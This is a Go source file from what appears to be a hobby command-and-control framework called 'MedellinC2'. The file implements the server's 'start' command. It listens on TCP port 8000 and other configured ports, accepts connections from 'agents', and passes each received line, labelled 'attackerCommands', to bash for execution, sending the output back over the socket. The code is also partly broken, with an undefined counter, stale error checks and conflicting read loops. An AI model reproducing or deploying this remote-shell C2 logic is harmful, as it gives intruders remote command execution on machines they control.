/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

var logo = `
_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
 \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
	`

// startCmd represents the start command
var startCmd = &cobra.Command{
	Use:   "start",
	Short: "Starts the C2 server",
	Long:  `Starts the TCP server to begin listening and handling connections agents`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("start called")
		//listenForConnections()
		server()
	},
}

func init() {
	serverCmd.AddCommand(startCmd)
}

func handleConnection(c net.Conn) {
	fmt.Print("Agent successfully connected to MedellinC2 Server\n")
	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}

		temp := strings.TrimSpace(string(netData))
		if temp == "STOP" {
			break
		}
		fmt.Println(temp)
		counter := strconv.Itoa(count) + "\n"
		c.Write([]byte(string(counter)))
	}
	c.Close()
}

/*
func listenForConnections() {

	//println(logo)
	//println("Medlelin C2 Server Successfully Started...")
	//println("Listeners are running over ports: " + data.GetListenerPorts())

	//Allows us to listen over multiple ports
	for _, port := range checkListenerPorts() { //When you don't really care about the index use _,
		go handlePorts(port)
	}
	for {
		time.Sleep(time.Second * 30) //without this, we cannot connect over two ports at once
	}

} */

func handlePorts(port string) {
	l, err := net.Listen("tcp4", ":"+port)

	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	for {
		connection, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(connection)
		//count++
		//handle commands
		for {
			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			connection.Write(out)
		}
	}

}

//TESTING
func handleClientRequest(con net.Conn) {
	defer con.Close()

	clientReader := bufio.NewReader(con)
	println("A new agent has successfully connected")
	for {
		// Waiting for the client request
		clientRequest, err := clientReader.ReadString('\n')

		switch err {
		case nil:
			clientRequest := strings.TrimSpace(clientRequest)
			if clientRequest == ":QUIT" {
				log.Println("agent willingly requested server to close the connection so closing")
				return
			} else {
				//log.Println(clientRequest)	//prints out user input after the new agent outputs "agent successfully connected" to server console
			}
		case io.EOF:
			log.Println("agent died. closed the connection by terminating the process")
			return
		default:
			log.Printf("error: %v\n", err)
			return
		}

		// Responding to the client request
		if _, err = con.Write([]byte("Command succesfully executed. Successfully Connected to MedellinC2! Please Continue interacting with your agent\n")); err != nil {
			log.Printf("failed to respond to client: %v\n", err)
		}

		//attacker commmands
		for {
			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			con.Write(out)
		}
		//if connection closes after some commands were ran print to server console
	}
}

func server() {
	println(logo)
	//checkListenerPorts()
	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()

	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
	for {
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}

		// If you want, you can increment a counter here and inject to handleClientRequest below as client identifier
		go handleClientRequest(con)

		//go acceptLoop(listener2) //run Accept Loop in its own goroutine
		//check if more ports are open
	}
}

// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang

// Accept Loop
func acceptLoop(l net.Listener) {
	defer l.Close()
	for {
		c, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("New Connection found")
		handleClientRequest(c)
	}
}

func checkListenerPorts() {
	//Check all open ports in Listeners table in a loop and allow connections over those ports
	//format GetListenerPorts()
	s := data.GetListenerPorts() //string that contains every port
	v := strings.SplitN(s, ",", len(s))
	//fmt.Print(v)
	for i := 0; i < len(v); i++ {
		//println(v[i])
		listener2, err := net.Listen("tcp", "0.0.0.0:"+v[i])
		if err != nil { //error handling
			log.Fatal(err)
		}
		go acceptLoop(listener2)
	}

}
